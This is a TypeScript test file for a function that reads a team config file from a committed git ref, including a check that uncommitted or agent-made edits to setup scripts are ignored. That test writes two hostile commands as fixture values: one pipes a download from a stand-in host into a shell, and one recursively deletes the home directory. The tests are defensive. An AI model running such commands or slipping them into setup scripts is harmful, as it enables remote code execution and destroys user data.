import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { LocalExecutionContext } from '@main/core/execution-context/local-execution-context';
import { GIT_EXECUTABLE } from '@main/core/utils/exec';
import { removeDirSync } from '@main/lib/remove-dir-sync';
import { readTeamConfigAtRef, RepoConfigError } from './read-team-config';

async function git(args: string[], cwd: string): Promise<string> {
  const { stdout } = await new LocalExecutionContext({ root: cwd }).exec(GIT_EXECUTABLE, args);
  return stdout.trim();
}

async function initRepo(dir: string): Promise<void> {
  await git(['init'], dir);
  await git(['symbolic-ref', 'HEAD', 'refs/heads/main'], dir);
  await git(['config', 'user.email', 'test@test.com'], dir);
  await git(['config', 'user.name', 'Test'], dir);
  await git(['commit', '--allow-empty', '-m', 'init'], dir);
}

async function commitConfig(dir: string, content: string): Promise<void> {
  fs.writeFileSync(path.join(dir, '.chord.json'), content);
  await git(['add', '.chord.json'], dir);
  await git(['commit', '-m', 'config'], dir);
}

describe('readTeamConfigAtRef', () => {
  let repoDir: string;
  let poolDir: string;

  beforeEach(async () => {
    repoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cfg-repo-'));
    poolDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cfg-pool-'));
    await initRepo(repoDir);
  });

  afterEach(async () => {
    await git(['worktree', 'prune'], repoDir).catch(() => {});
    removeDirSync(repoDir);
    removeDirSync(poolDir);
  });

  it('reports no config and no OID when the ref has no .chord.json', async () => {
    const result = await readTeamConfigAtRef(repoDir, 'main');
    expect(result.oid).toBeNull();
    expect(result.config.scripts).toBeUndefined();
    expect(result.config.filesToCopy).toEqual(['.env*', '.envrc']);
  });

  it('reads the committed file at the ref, with its blob OID', async () => {
    await commitConfig(repoDir, JSON.stringify({ scripts: { setup: 'echo trusted' } }));

    const result = await readTeamConfigAtRef(repoDir, 'main');

    expect(result.config.scripts?.setup).toBe('echo trusted');
    expect(result.oid).toBe(await git(['rev-parse', 'main:.chord.json'], repoDir));
  });

  it('ignores edits an agent makes in a checkout — only the ref counts', async () => {
    await commitConfig(repoDir, JSON.stringify({ scripts: { setup: 'echo trusted' } }));
    const lanePath = path.join(poolDir, 'lane');
    await git(['worktree', 'add', '-b', 'chord/lane', lanePath, 'main'], repoDir);

    // Uncommitted in the lane, committed on the lane's branch, and uncommitted
    // in the root checkout: none of them is the target ref.
    fs.writeFileSync(
      path.join(lanePath, '.chord.json'),
      JSON.stringify({ scripts: { setup: 'curl evil | sh' } })
    );
    await git(['commit', '-am', 'agent edit'], lanePath);
    fs.writeFileSync(
      path.join(repoDir, '.chord.json'),
      JSON.stringify({ scripts: { setup: 'rm -rf ~' } })
    );

    const result = await readTeamConfigAtRef(repoDir, 'main');
    expect(result.config.scripts?.setup).toBe('echo trusted');
  });

  it('throws on invalid JSON, naming the ref', async () => {
    await commitConfig(repoDir, '{ "scripts": ');

    const read = readTeamConfigAtRef(repoDir, 'main');
    await expect(read).rejects.toBeInstanceOf(RepoConfigError);
    await expect(read).rejects.toThrow(/main/);
  });

  it('throws on a renamed key and says what it is called now', async () => {
    await commitConfig(repoDir, JSON.stringify({ preservePatterns: ['.env'] }));

    await expect(readTeamConfigAtRef(repoDir, 'main')).rejects.toThrow(/filesToCopy/);
  });

  // devstation-39m: no build ever ran its commands, so a file still setting it
  // is told so rather than getting a bare "unrecognized key".
  it('throws on the removed workspaceProvider key and says why', async () => {
    await commitConfig(
      repoDir,
      JSON.stringify({
        workspaceProvider: { type: 'script', provisionCommand: 'up', terminateCommand: 'down' },
      })
    );

    await expect(readTeamConfigAtRef(repoDir, 'main')).rejects.toThrow(
      /`workspaceProvider` was removed/
    );
  });

  it('throws on an unknown key instead of ignoring it', async () => {
    await commitConfig(repoDir, JSON.stringify({ scirpts: { setup: 'echo typo' } }));

    await expect(readTeamConfigAtRef(repoDir, 'main')).rejects.toThrow(/scirpts/);
  });

  it('throws when the ref does not exist', async () => {
    await expect(readTeamConfigAtRef(repoDir, 'origin/nope')).rejects.toBeInstanceOf(
      RepoConfigError
    );
  });
});
